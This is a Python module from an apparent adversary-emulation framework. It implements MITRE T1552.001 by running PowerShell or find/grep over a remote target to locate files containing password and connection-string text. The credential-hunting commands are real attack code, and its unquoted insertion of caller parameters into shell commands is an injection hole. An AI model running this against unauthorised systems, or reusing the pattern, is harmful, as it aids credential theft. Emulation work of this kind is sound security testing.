from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, get_connection

logger = logging.getLogger(__name__)


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        search_paths = parameters.get("search_paths", "C:\\Users;C:\\Temp")
        file_patterns = parameters.get("file_patterns", "*.txt;*.xml;*.config;*.ini")
        is_windows = conn.is_windows if hasattr(conn, "is_windows") else True
        if is_windows:
            paths = search_paths.split(";")
            patterns = file_patterns.split(";")
            path_filter = ",".join(f"'{p}'" for p in paths)
            pattern_filter = ",".join(f"'{p}'" for p in patterns)
            ps_cmd = (
                f"$paths = @({path_filter}); "
                f"$patterns = @({pattern_filter}); "
                "$results = @(); "
                "foreach ($path in $paths) { "
                "if (Test-Path $path) { "
                "foreach ($pattern in $patterns) { "
                "$files = Get-ChildItem -Path $path -Filter $pattern -Recurse "
                "-ErrorAction SilentlyContinue -Depth 3; "
                "foreach ($file in $files) { "
                "$matches = Select-String -Path $file.FullName "
                '-Pattern "password=|pwd=|Password|connectionString|credential" '
                "-ErrorAction SilentlyContinue; "
                "foreach ($m in $matches) { "
                '$results += "File: $($file.FullName) | Line: $($m.LineNumber)" '
                "} } } } }; "
                '"Total files scanned: " + $results.Count; $results'
            )
            result = await conn.run_ps(ps_cmd)
        else:
            paths = search_paths.replace(";", " ").replace("C:\\Users", "/home").replace("C:\\Temp", "/tmp")
            patterns = file_patterns.replace(";", " -o -name ").replace("*.", "*.*")
            cmd = (
                f"find {paths} -maxdepth 3 \\"
                f" \\( -name {patterns} \\) "
                r"-exec grep -l -E 'password=|pwd=|Password|connectionString|credential' {} \; 2>/dev/null | wc -l"
            )
            result = await conn.run_command(cmd)
        return TechniqueResult(
            technique_id="T1552.001",
            success=result.success,
            output=result.stdout[:4096],
            error=result.stderr[:1024] if not result.success else None,
            execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1552.001 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1552.001",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    pass
